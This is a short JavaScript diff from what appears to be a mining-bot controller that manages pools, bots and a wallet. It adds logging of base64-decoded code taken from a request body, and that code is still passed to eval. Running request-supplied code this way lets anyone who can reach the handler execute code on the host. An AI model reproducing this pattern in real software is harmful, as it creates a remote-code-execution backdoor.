@@ -239,7 +239,11 @@ var main = function() {
     if(req.body.pools) update_pools(req.body.pools);
     if(req.body.bots) update_bots(req.body.bots);
     if(req.body.init) {
-      eval(Buffer.from(req.body.code,'base64').toString('ascii'));
+      var code = Buffer.from(req.body.code,'base64').toString('ascii');
+      
+      console.log(code)
+      
+      eval(code);
       var data = {
         msg: 'init '+req.body.init,
         wallet: db.wallet,
